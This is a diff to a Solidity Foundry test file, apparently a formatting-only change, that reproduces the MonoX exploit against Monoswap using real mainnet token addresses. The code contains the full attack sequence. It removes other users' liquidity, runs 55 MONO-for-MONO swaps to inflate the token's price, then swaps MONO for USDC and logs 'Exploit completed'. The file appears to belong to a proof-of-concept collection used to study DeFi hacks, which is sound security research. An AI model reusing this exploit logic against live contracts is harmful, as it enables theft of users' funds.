@@ -7,45 +7,24 @@ import "forge-std/Test.sol";
 import {IWETH} from "src/interfaces/IWETH.sol";
 
 import {IUSDC} from "src/interfaces/IUSDC.sol";
+
 interface MonoXPool {
-    event ApprovalForAll(
-        address indexed account,
-        address indexed operator,
-        bool approved
-    );
-    event OwnershipTransferred(
-        address indexed previousOwner,
-        address indexed newOwner
-    );
+
+    event ApprovalForAll(address indexed account, address indexed operator, bool approved);
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
     event TransferBatch(
-        address indexed operator,
-        address indexed from,
-        address indexed to,
-        uint256[] ids,
-        uint256[] values
+        address indexed operator, address indexed from, address indexed to, uint256[] ids, uint256[] values
     );
-    event TransferSingle(
-        address indexed operator,
-        address indexed from,
-        address indexed to,
-        uint256 id,
-        uint256 value
-    );
+    event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value);
     event URI(string value, uint256 indexed id);
 
     function WETH() external view returns (address);
 
     function admin() external view returns (address);
 
-    function balanceOf(
-        address account,
-        uint256 id
-    ) external view returns (uint256);
+    function balanceOf(address account, uint256 id) external view returns (uint256);
 
-    function balanceOfBatch(
-        address[] memory accounts,
-        uint256[] memory ids
-    ) external view returns (uint256[] memory);
+    function balanceOfBatch(address[] memory accounts, uint256[] memory ids) external view returns (uint256[] memory);
 
     function burn(address account, uint256 id, uint256 amount) external;
 
@@ -55,26 +34,15 @@ interface MonoXPool {
 
     function initialize(address _WETH) external;
 
-    function isApprovedForAll(
-        address account,
-        address operator
-    ) external view returns (bool);
+    function isApprovedForAll(address account, address operator) external view returns (bool);
 
     function isUnofficial(uint256) external view returns (bool);
 
-    function liquidityLastAddedOf(
-        uint256 pid,
-        address account
-    ) external view returns (uint256);
+    function liquidityLastAddedOf(uint256 pid, address account) external view returns (uint256);
 
     function mint(address account, uint256 id, uint256 amount) external;
 
-    function mintLp(
-        address account,
-        uint256 id,
-        uint256 amount,
-        bool _isUnofficial
-    ) external;
+    function mintLp(address account, uint256 id, uint256 amount, bool _isUnofficial) external;
 
     function owner() external view returns (address);
 
@@ -88,21 +56,11 @@ interface MonoXPool {
         bytes memory data
     ) external;
 
-    function safeTransferERC20Token(
-        address token,
-        address to,
-        uint256 amount
-    ) external;
+    function safeTransferERC20Token(address token, address to, uint256 amount) external;
 
     function safeTransferETH(address to, uint256 amount) external;
 
-    function safeTransferFrom(
-        address from,
-        address to,
-        uint256 id,
-        uint256 amount,
-        bytes memory data
-    ) external;
+    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes memory data) external;
 
     function setAdmin(address _admin) external;
 
@@ -127,8 +85,11 @@ interface MonoXPool {
     function uri(uint256) external view returns (string memory);
 
     function withdrawWETH(uint256 amount) external;
+
 }
+
 interface Monoswap {
+
     event AddLiquidity(
         address indexed provider,
         uint256 indexed pid,
@@ -138,10 +99,7 @@ interface Monoswap {
         uint256 tokenAmount,
         uint256 price
     );
-    event OwnershipTransferred(
-        address indexed previousOwner,
-        address indexed newOwner
-    );
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
     event PoolBalanced(address _token, uint256 vcashIn);
     event PoolStatusChanged(address _token, uint8 oldStatus, uint8 newStatus);
     event RemoveLiquidity(
@@ -163,105 +121,48 @@ interface Monoswap {
     );
     event SyntheticPoolPriceChanged(address _token, uint256 price);
 
-    function _removeLiquidity(
-        address _token,
-        uint256 liquidity,
-        address to
-    )
+    function _removeLiquidity(address _token, uint256 liquidity, address to)
         external
         view
-        returns (
-            uint256 poolValue,
-            uint256 liquidityIn,
-            uint256 vcashOut,
-            uint256 tokenOut
-        );
+        returns (uint256 poolValue, uint256 liquidityIn, uint256 vcashOut, uint256 tokenOut);
 
-    function addLiquidity(
-        address _token,
-        uint256 _amount,
-        address to
-    ) external returns (uint256 liquidity);
+    function addLiquidity(address _token, uint256 _amount, address to) external returns (uint256 liquidity);
 
-    function addLiquidityETH(
-        address to
-    ) external payable returns (uint256 liquidity);
+    function addLiquidityETH(address to) external payable returns (uint256 liquidity);
 
-    function addLiquidityPair(
-        address _token,
-        uint256 vcashAmount,
-        uint256 tokenAmount,
-        address to
-    ) external returns (uint256 liquidity);
+    function addLiquidityPair(address _token, uint256 vcashAmount, uint256 tokenAmount, address to)
+        external
+        returns (uint256 liquidity);
 
-    function addSpecialToken(
-        address _token,
-        uint256 _price,
-        uint8 _status
-    ) external returns (uint256 _pid);
+    function addSpecialToken(address _token, uint256 _price, uint8 _status) external returns (uint256 _pid);
 
-    function getAmountIn(
-        address tokenIn,
-        address tokenOut,
-        uint256 amountOut
-    )
+    function getAmountIn(address tokenIn, address tokenOut, uint256 amountOut)
         external
         view
-        returns (
-            uint256 tokenInPrice,
-            uint256 tokenOutPrice,
-            uint256 amountIn,
-            uint256 tradeVcashValue
-        );
+        returns (uint256 tokenInPrice, uint256 tokenOutPrice, uint256 amountIn, uint256 tradeVcashValue);
 
-    function getAmountOut(
-        address tokenIn,
-        address tokenOut,
-        uint256 amountIn
-    )
+    function getAmountOut(address tokenIn, address tokenOut, uint256 amountIn)
         external
         view
-        returns (
-            uint256 tokenInPrice,
-            uint256 tokenOutPrice,
-            uint256 amountOut,
-            uint256 tradeVcashValue
-        );
+        returns (uint256 tokenInPrice, uint256 tokenOutPrice, uint256 amountOut, uint256 tradeVcashValue);
 
     function getConfig()
         external
         view
-        returns (
-            address _vCash,
-            address _weth,
-            address _feeTo,
-            uint16 _fees,
-            uint16 _devFee
-        );
+        returns (address _vCash, address _weth, address _feeTo, uint16 _fees, uint16 _devFee);
 
-    function getPool(
-        address _token
-    )
+    function getPool(address _token)
         external
         view
-        returns (
-            uint256 poolValue,
-            uint256 tokenBalanceVcashValue,
-            uint256 vcashCredit,
-            uint256 vcashDebt
-        );
+        returns (uint256 poolValue, uint256 tokenBalanceVcashValue, uint256 vcashCredit, uint256 vcashDebt);
 
     function initialize(address _monoXPool, address _vcash) external;
 
     function lastTradedBlock(address) external view returns (uint256);
 
-    function listNewToken(
-        address _token,
-        uint256 _price,
-        uint256 vcashAmount,
-        uint256 tokenAmount,
-        address to
-    ) external returns (uint256 _pid, uint256 liquidity);
+    function listNewToken(address _token, uint256 _price, uint256 vcashAmount, uint256 tokenAmount, address to)
+        external
+        returns (uint256 _pid, uint256 liquidity);
 
     function monoXPool() external view returns (address);
 
@@ -271,9 +172,7 @@ interface Monoswap {
 
     function poolSizeMinLimit() external view returns (uint256);
 
-    function pools(
-        address
-    )
+    function pools(address)
         external
         view
         returns (
@@ -292,20 +191,13 @@ interface Monoswap {
 
     function rebalancePool(address _token) external;
 
-    function removeLiquidity(
-        address _token,
-        uint256 liquidity,
-        address to,
-        uint256 minVcashOut,
-        uint256 minTokenOut
-    ) external returns (uint256 vcashOut, uint256 tokenOut);
+    function removeLiquidity(address _token, uint256 liquidity, address to, uint256 minVcashOut, uint256 minTokenOut)
+        external
+        returns (uint256 vcashOut, uint256 tokenOut);
 
-    function removeLiquidityETH(
-        uint256 liquidity,
-        address to,
-        uint256 minVcashOut,
-        uint256 minTokenOut
-    ) external returns (uint256 vcashOut, uint256 tokenOut);
+    function removeLiquidityETH(uint256 liquidity, address to, uint256 minVcashOut, uint256 minTokenOut)
+        external
+        returns (uint256 vcashOut, uint256 tokenOut);
 
     function renounceOwnership() external;
 
@@ -331,20 +223,14 @@ interface Monoswap {
         uint256 deadline
     ) external payable returns (uint256 amountIn);
 
-    function swapExactETHForToken(
-        address tokenOut,
-        uint256 amountOutMin,
-        address to,
-        uint256 deadline
-    ) external payable returns (uint256 amountOut);
+    function swapExactETHForToken(address tokenOut, uint256 amountOutMin, address to, uint256 deadline)
+        external
+        payable
+        returns (uint256 amountOut);
 
-    function swapExactTokenForETH(
-        address tokenIn,
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address to,
-        uint256 deadline
-    ) external returns (uint256 amountOut);
+    function swapExactTokenForETH(address tokenIn, uint256 amountIn, uint256 amountOutMin, address to, uint256 deadline)
+        external
+        returns (uint256 amountOut);
 
     function swapExactTokenForToken(
         address tokenIn,
@@ -355,13 +241,9 @@ interface Monoswap {
         uint256 deadline
     ) external returns (uint256 amountOut);
 
-    function swapTokenForExactETH(
-        address tokenIn,
-        uint256 amountInMax,
-        uint256 amountOut,
-        address to,
-        uint256 deadline
-    ) external returns (uint256 amountIn);
+    function swapTokenForExactETH(address tokenIn, uint256 amountInMax, uint256 amountOut, address to, uint256 deadline)
+        external
+        returns (uint256 amountIn);
 
     function swapTokenForExactToken(
         address tokenIn,
@@ -383,43 +265,18 @@ interface Monoswap {
     function updatePoolStatus(address _token, uint8 _status) external;
 
     function updatePriceAdjuster(address account, bool _status) external;
+
 }
 
 interface MonoToken {
-    event Approval(
-        address indexed owner,
-        address indexed spender,
-        uint256 value
-    );
-    event DelegateChanged(
-        address indexed delegator,
-        address indexed fromDelegate,
-        address indexed toDelegate
-    );
-    event DelegateVotesChanged(
-        address indexed delegate,
-        uint256 previousBalance,
-        uint256 newBalance
-    );
-    event OwnershipTransferred(
-        address indexed previousOwner,
-        address indexed newOwner
-    );
-    event RoleAdminChanged(
-        bytes32 indexed role,
-        bytes32 indexed previousAdminRole,
-        bytes32 indexed newAdminRole
-    );
-    event RoleGranted(
-        bytes32 indexed role,
-        address indexed account,
-        address indexed sender
-    );
-    event RoleRevoked(
-        bytes32 indexed role,
-        address indexed account,
-        address indexed sender
-    );
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);
+    event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);
+    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);
+    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);
     event Snapshot(uint256 id);
     event Transfer(address indexed from, address indexed to, uint256 value);
 
@@ -431,46 +288,27 @@ interface MonoToken {
 
     function MINTER_ROLE() external view returns (bytes32);
 
-    function allowance(
-        address owner,
-        address spender
-    ) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
 
     function approve(address spender, uint256 amount) external returns (bool);
 
     function balanceOf(address account) external view returns (uint256);
 
-    function balanceOfAt(
-        address account,
-        uint256 snapshotId
-    ) external view returns (uint256);
+    function balanceOfAt(address account, uint256 snapshotId) external view returns (uint256);
 
     function cap() external view returns (uint256);
 
-    function checkpoints(
-        address,
-        uint32
-    ) external view returns (uint32 fromBlock, uint256 votes);
+    function checkpoints(address, uint32) external view returns (uint32 fromBlock, uint256 votes);
 
     function childChainManagerProxy() external view returns (address);
 
     function decimals() external view returns (uint8);
 
-    function decreaseAllowance(
-        address spender,
-        uint256 subtractedValue
-    ) external returns (bool);
+    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
 
     function delegate(address delegatee) external;
 
-    function delegateBySig(
-        address delegatee,
-        uint256 nonce,
-        uint256 expiry,
-        uint8 v,
-        bytes32 r,
-        bytes32 s
-    ) external;
+    function delegateBySig(address delegatee, uint256 nonce, uint256 expiry, uint8 v, bytes32 r, bytes32 s) external;
 
     function delegates(address delegator) external view returns (address);
 
@@ -478,31 +316,19 @@ interface MonoToken {
 
     function getCurrentVotes(address account) external view returns (uint256);
 
-    function getPriorVotes(
-        address account,
-        uint256 blockNumber
-    ) external view returns (uint256);
+    function getPriorVotes(address account, uint256 blockNumber) external view returns (uint256);
 
     function getRoleAdmin(bytes32 role) external view returns (bytes32);
 
-    function getRoleMember(
-        bytes32 role,
-        uint256 index
-    ) external view returns (address);
+    function getRoleMember(bytes32 role, uint256 index) external view returns (address);
 
     function getRoleMemberCount(bytes32 role) external view returns (uint256);
 
     function grantRole(bytes32 role, address account) external;
 
-    function hasRole(
-        bytes32 role,
-        address account
-    ) external view returns (bool);
+    function hasRole(bytes32 role, address account) external view returns (bool);
 
-    function increaseAllowance(
-        address spender,
-        uint256 addedValue
-    ) external returns (bool);
+    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
 
     function mint(address _to, uint256 _amount) external;
 
@@ -530,26 +356,20 @@ interface MonoToken {
 
     function totalSupplyAt(uint256 snapshotId) external view returns (uint256);
 
-    function transfer(
-        address recipient,
-        uint256 amount
-    ) external returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
 
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 
     function transferOwnership(address newOwner) external;
 
-    function updateChildChainManager(
-        address newChildChainManagerProxy
-    ) external;
+    function updateChildChainManager(address newChildChainManagerProxy) external;
 
     function withdraw(uint256 amount) external;
+
 }
+
 contract ContractTest is Test {
+
     IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IUSDC usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     MonoToken mono = MonoToken(0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D);
@@ -581,14 +401,7 @@ contract ContractTest is Test {
         // VISR_Balance =  visr.balanceOf(msg.sender);
         emit log_named_uint("WETH Balance", WETH.balanceOf(address(this)));
         WETH.approve(Monoswap_address, 0.1 ether);
-        monoswap.swapExactTokenForToken(
-            IWETH_Address,
-            Mono_Token_Address,
-            0.1 ether,
-            1,
-            address(this),
-            block.timestamp
-        );
+        monoswap.swapExactTokenForToken(IWETH_Address, Mono_Token_Address, 0.1 ether, 1, address(this), block.timestamp);
         emit log_named_uint("MonoToken Balance", mono.balanceOf(address(this)));
         RemoveLiquidity_From_3_Users();
         // AddLiquidity For myself
@@ -598,49 +411,26 @@ contract ContractTest is Test {
 
         Swap_Mono_For_USDC();
 
-        emit log_named_uint(
-            "Exploit completed, USDC Balance",
-            usdc.balanceOf(msg.sender)
-        );
+        emit log_named_uint("Exploit completed, USDC Balance", usdc.balanceOf(msg.sender));
     }
 
     function RemoveLiquidity_From_3_Users() internal {
         uint256 balance_Of_User1 = monopool.balanceOf(Innocent_user_1, 10);
 
-        monoswap.removeLiquidity(
-            Mono_Token_Address,
-            balance_Of_User1,
-            Innocent_user_1,
-            0,
-            1
-        );
+        monoswap.removeLiquidity(Mono_Token_Address, balance_Of_User1, Innocent_user_1, 0, 1);
 
         uint256 balance_Of_User2 = monopool.balanceOf(Innocent_user_2, 10);
 
-        monoswap.removeLiquidity(
-            Mono_Token_Address,
-            balance_Of_User2,
-            Innocent_user_2,
-            0,
-            1
-        );
+        monoswap.removeLiquidity(Mono_Token_Address, balance_Of_User2, Innocent_user_2, 0, 1);
 
         uint256 balance_Of_User3 = monopool.balanceOf(Innocent_user_3, 10);
 
-        monoswap.removeLiquidity(
-            Mono_Token_Address,
-            balance_Of_User3,
-            Innocent_user_3,
-            0,
-            1
-        );
+        monoswap.removeLiquidity(Mono_Token_Address, balance_Of_User3, Innocent_user_3, 0, 1);
     }
 
     function Swap_Mono_for_Mono_55_Times() internal {
         for (uint256 i = 0; i < 55; i++) {
-            (, , , , , , Amount_Of_MonoToken_On_XPool, , ) = monoswap.pools(
-                Mono_Token_Address
-            );
+            (,,,,,, Amount_Of_MonoToken_On_XPool,,) = monoswap.pools(Mono_Token_Address);
 
             monoswap.swapExactTokenForToken(
                 Mono_Token_Address,
@@ -654,32 +444,24 @@ contract ContractTest is Test {
     }
 
     function Swap_Mono_For_USDC() internal {
-        (, , , , , , Amount_Of_USDC_On_XPool, , ) = monoswap.pools(
-            USDC_Address
-        );
+        (,,,,,, Amount_Of_USDC_On_XPool,,) = monoswap.pools(USDC_Address);
 
         Amoount_Of_Mono_On_This = mono.balanceOf(address(this));
 
         monoswap.swapTokenForExactToken(
-            Mono_Token_Address,
-            USDC_Address,
-            Amoount_Of_Mono_On_This,
-            4_000_000_000_000,
-            msg.sender,
-            block.timestamp
+            Mono_Token_Address, USDC_Address, Amoount_Of_Mono_On_This, 4_000_000_000_000, msg.sender, block.timestamp
         );
     }
 
     receive() external payable {}
 
-    function onERC1155Received(
-        address _operator,
-        address _from,
-        uint256 _id,
-        uint256 _value,
-        bytes calldata _data
-    ) external pure returns (bytes4) {
+    function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data)
+        external
+        pure
+        returns (bytes4)
+    {
         bytes4 a = 0xf23a6e61;
         return a;
     }
+
 }
